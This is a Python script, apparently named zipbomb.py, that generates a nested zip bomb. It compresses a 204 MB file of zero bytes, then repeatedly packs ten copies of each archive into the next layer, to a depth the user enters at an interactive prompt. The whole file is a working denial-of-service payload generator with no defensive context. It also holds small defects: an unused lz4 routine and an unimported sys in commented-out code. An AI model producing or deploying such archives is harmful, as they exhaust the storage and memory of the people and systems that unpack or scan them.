import zipfile
import shutil
import os
import time
import lz4.frame


def fileSize(filename):
    st = os.stat(filename)
    return st.st_size


def makeTempFile(filename):
    with open(filename, 'wb') as cache:
        for i in range(204):
            chunk = bytearray(1048576 * b'0')
            cache.write(chunk)


def filenameNoExt(name):
    return name[:name.rfind('.')]


def fileExt(name):
    return name[name.rfind('.') + 1:]


def compressFile(infile, outfile):
    with open(infile, "rb") as f_in:
        with open(outfile, "wb") as f_out:
            compressor = lz4.frame.LZ4F_compressFrame
            block_size = 1024*1024
            while True:
                data = f_in.read(block_size)
                if not data:
                    break
                compressed_data = compressor(data)
                f_out.write(compressed_data)

def compressFileOld(infile, outfile):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()


def copyandcompress(infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64=True)
    for i in range(n_copies):
        f_name = '%s-%d.%s' % (filenameNoExt(infile), i, fileExt(infile))
        shutil.copy(infile, f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()


def makeBomb(levels, fileName):
    # Set Variables
    n_levels = levels
    out_zip_file = fileName
    dummy_name = 'cache.txt'
    start_time = time.time()
    # Start
    time1 = int(time.time())
    print('making "cache" file...\n')
    makeTempFile(dummy_name)
    time2=time.time()
    print('done making cache. making 1.zip. action took %.2f\n' % (time.time()-time1))
    level_1_zip = '1.zip'
    time3=time.time()
    print('compressing...\n')
    compressFileOld(dummy_name, level_1_zip)
    time4=time.time()
    decompressed_size = 0.1
    print('done compressing. removing cache. action took %.2f\n' % (time.time()-time3))
    os.remove(dummy_name)
    print('done removing. action took %.2f\n' % (time.time()-time4))
    print('starting layers... to now took %.2f\n' % (time.time()-start_time))
    for i in range(1, n_levels + 1):
        copyandcompress('%d.zip' % i, '%d.zip' % (i + 1), 10)
        decompressed_size *= 10
        os.remove('%d.zip' % i)
        print('layer ' + str(i) + ' done')
    print('\n')
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename('%d.zip' % (n_levels + 1), out_zip_file)
    end_time = time.time()
    print('Compressed File Size: %.2f KB' % (fileSize(out_zip_file) / 1024.0))
    print('Size After Decompression: %d GB' % decompressed_size)
    print('Generation Time: %.2fs' % (end_time - start_time))
    return out_zip_file



level = str(input('level: the more the merrier\n'))
print('\n')
name = str(input('desired file name-EX: [name].zip\n'))
t1 = name.split(".")
t2 = len(t1)
if (t2 == 1):
    name = name + ".zip"
    print("\nyou did not enter a .zip file, so we added it for you\n")
makeBomb(int(level), name)

# if __name__ == '__main__':
#	if len(sys.argv) < 3:
#		print ('Usage:\n')
#		print (' zipbomb.py n_levels out_zip_file')
#		exit()




